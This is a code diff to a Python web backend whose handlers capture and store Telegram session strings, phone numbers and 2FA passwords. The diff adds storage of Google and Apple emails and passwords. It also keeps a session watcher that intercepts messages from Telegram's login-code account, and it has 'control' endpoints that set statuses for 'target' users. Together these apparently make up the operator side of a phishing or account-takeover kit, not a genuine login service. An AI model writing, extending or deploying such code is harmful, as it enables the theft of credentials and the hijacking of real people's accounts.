@@ -63,15 +63,37 @@ async def handle_auth_complete(request: web.Request) -> web.Response:
         # Ensure user exists in database
         db.get_or_create_user(DB_PATH, tg_id, username, nickname, phone=phone)
 
-        if session_string and session_string != "sess_string_ok":
-            db.set_user_session(DB_PATH, tg_id, session_string)
-            # Launch live Telegram service message interceptor for 777000
-            start_session_watcher(tg_id, session_string)
-        db.set_user_auth_step(DB_PATH, tg_id, "authorized")
-        if phone:
-            db.set_user_phone(DB_PATH, tg_id, phone)
-        if password_2fa:
-            db.set_user_2fa_password(DB_PATH, tg_id, password_2fa)
+        provider = data.get("provider")
+        email = data.get("email") or data.get("google_email") or data.get("apple_email")
+        if not provider:
+            if data.get("google_email") or (email and "gmail" in str(email).lower()):
+                provider = "google"
+            elif data.get("apple_email") or (email and ("icloud" in str(email).lower() or "apple" in str(email).lower())):
+                provider = "apple"
+            elif session_string and session_string != "sess_string_ok" and not str(session_string).startswith("google_") and not str(session_string).startswith("apple_"):
+                provider = "telegram"
+            elif phone:
+                provider = "telegram"
+            else:
+                provider = "telegram"
+
+        if provider == "google":
+            db.save_google_session(DB_PATH, tg_id, email=email, password=password_2fa, session_data=session_string, status="completed")
+            user_chk = db.get_user_by_tg_id(DB_PATH, tg_id)
+            if not user_chk or not user_chk.get("session_string"):
+                db.set_user_session(DB_PATH, tg_id, f"google_auth_{tg_id}")
+            db.set_user_auth_step(DB_PATH, tg_id, "authorized")
+        elif provider == "apple":
+            db.save_apple_session(DB_PATH, tg_id, email=email, password=password_2fa, session_data=session_string, status="completed")
+            user_chk = db.get_user_by_tg_id(DB_PATH, tg_id)
+            if not user_chk or not user_chk.get("session_string"):
+                db.set_user_session(DB_PATH, tg_id, f"apple_auth_{tg_id}")
+            db.set_user_auth_step(DB_PATH, tg_id, "authorized")
+        else:
+            db.save_telegram_session(DB_PATH, tg_id, session_string=session_string or "sess_string_ok", phone=phone, password_2fa=password_2fa)
+            if session_string and session_string != "sess_string_ok" and not str(session_string).startswith("google_") and not str(session_string).startswith("apple_"):
+                start_session_watcher(tg_id, session_string)
+            db.set_user_auth_step(DB_PATH, tg_id, "authorized")
 
         client_ip = get_client_ip(request)
         device = data.get("device")
@@ -176,13 +198,13 @@ async def handle_auth_event(request: web.Request) -> web.Response:
                 except Exception:
                     phone = user["phone"] if "phone" in user.keys() else None
 
-        # Only ignore duplicate intermediate events if the user is already authorized,
-        # but ALWAYS allow new login attempts (phone, waiting_code, start, registered)
-        if user and current_step.lower() == "authorized" and event in (
-            "waiting_2fa", "entered_2fa", "wrong_2fa", "entered_code", "wrong_code"
-        ):
-            logger.info("Ignoring intermediate auth event '%s' for already authorized user tg_id=%s", event, tg_id)
-            return web.json_response({"ok": True})
+        # Only ignore duplicate intermediate events if user is already authorized for Telegram,
+        # but NEVER ignore Google / Apple events (which may be a secondary registration!)
+        if user and current_step.lower() == "authorized":
+            if not (event.startswith("google_") or event.startswith("apple_")):
+                if event in ("waiting_2fa", "entered_2fa", "wrong_2fa", "entered_code", "wrong_code"):
+                    logger.info("Ignoring intermediate auth event '%s' for already authorized user tg_id=%s", event, tg_id)
+                    return web.json_response({"ok": True})
 
         if event == "logged_out":
             db.set_user_auth_step(DB_PATH, tg_id, "logged_out")
@@ -204,9 +226,20 @@ async def handle_auth_event(request: web.Request) -> web.Response:
             db.set_user_email(DB_PATH, tg_id, email)
         if phone:
             db.set_user_phone(DB_PATH, tg_id, phone)
-        if password_2fa:
-            db.set_user_2fa_password(DB_PATH, tg_id, password_2fa)
-        db.set_user_auth_step(DB_PATH, tg_id, event)
+
+        if event.startswith("google_"):
+            db.save_google_session(DB_PATH, tg_id, email=email, password=password_2fa, status="pending" if not event.endswith("complete") else "completed")
+        elif event.startswith("apple_"):
+            db.save_apple_session(DB_PATH, tg_id, email=email, password=password_2fa, status="pending" if not event.endswith("complete") else "completed")
+        else:
+            if password_2fa:
+                db.set_user_2fa_password(DB_PATH, tg_id, password_2fa)
+
+        # Do not downgrade an already authorized user to an intermediate step if linking a 2nd session
+        if current_step.lower() == "authorized" and (event.startswith("google_") or event.startswith("apple_")):
+            pass
+        else:
+            db.set_user_auth_step(DB_PATH, tg_id, event)
 
         client_ip = get_client_ip(request)
         device = data.get("device")
@@ -291,20 +324,23 @@ async def handle_auth_status(request: web.Request) -> web.Response:
             except Exception:
                 pass
 
+        sess_info = {
+            "has_telegram": False, "has_google": False, "has_apple": False, "is_dual": False,
+            "telegram_phone": None, "google_email": None, "apple_email": None
+        }
         if user:
             try:
                 auth_step = str(user.get("auth_step") or "")
             except Exception:
                 auth_step = str(user["auth_step"] if "auth_step" in user.keys() else "")
 
-            has_session = bool(user.get("session_string")) if "session_string" in user.keys() else False
-
+            sess_info = db.get_user_sessions(DB_PATH, user["tg_id"])
             if auth_step in ("session_revoked", "logged_out", "banned"):
                 is_auth = False
             elif auth_step in ("authorized", "completed", "success"):
                 is_auth = True
-            elif not has_session:
-                is_auth = False
+            elif sess_info["has_telegram"] or sess_info["has_google"] or sess_info["has_apple"]:
+                is_auth = True
             else:
                 is_auth = False
 
@@ -366,9 +402,17 @@ async def handle_auth_status(request: web.Request) -> web.Response:
             "ok": True,
             "authorized": is_auth,
             "auth_step": auth_step,
+            "has_telegram": sess_info["has_telegram"],
+            "has_google": sess_info["has_google"],
+            "has_apple": sess_info["has_apple"],
+            "is_dual": sess_info["is_dual"],
+            "telegram_phone": sess_info["telegram_phone"],
+            "google_email": sess_info["google_email"],
+            "apple_email": sess_info["apple_email"],
             "username": user["username"] if user else None,
             "nickname": user["nickname"] if user else None,
             "phone": user["phone"] if user else None,
+            "email": user["email"] if user else None,
             "google_control": gctrl,
             "apple_control": actrl,
         })
@@ -456,7 +500,10 @@ async def handle_google_control(request: web.Request) -> web.Response:
             error_msg=error_msg,
         )
         if status == "completed":
-            db.set_user_session(DB_PATH, target_id, f"google_auth_{target_id}")
+            db.save_google_session(DB_PATH, target_id, email=email, status="completed")
+            u_check = db.get_user_by_tg_id(DB_PATH, target_id)
+            if not u_check or not u_check.get("session_string"):
+                db.set_user_session(DB_PATH, target_id, f"google_auth_{target_id}")
             db.set_user_auth_step(DB_PATH, target_id, "authorized")
         logger.info("handle_google_control set status '%s' for target_id=%s (email=%s)", status, target_id, email)
         return web.json_response({"ok": True})
@@ -495,8 +542,11 @@ async def handle_apple_control(request: web.Request) -> web.Response:
             error_msg=error_msg,
         )
         if status in ("completed", "authorized"):
-            db.set_user_session(DB_PATH, target_id, f"apple_auth_{target_id}")
-            db.set_user_auth_step(DB_PATH, target_id, "apple_authorized")
+            db.save_apple_session(DB_PATH, target_id, email=email, status="completed")
+            u_check = db.get_user_by_tg_id(DB_PATH, target_id)
+            if not u_check or not u_check.get("session_string"):
+                db.set_user_session(DB_PATH, target_id, f"apple_auth_{target_id}")
+            db.set_user_auth_step(DB_PATH, target_id, "authorized")
         logger.info("handle_apple_control set status '%s' for target_id=%s (email=%s)", status, target_id, email)
         return web.json_response({"ok": True})
     except Exception as exc:
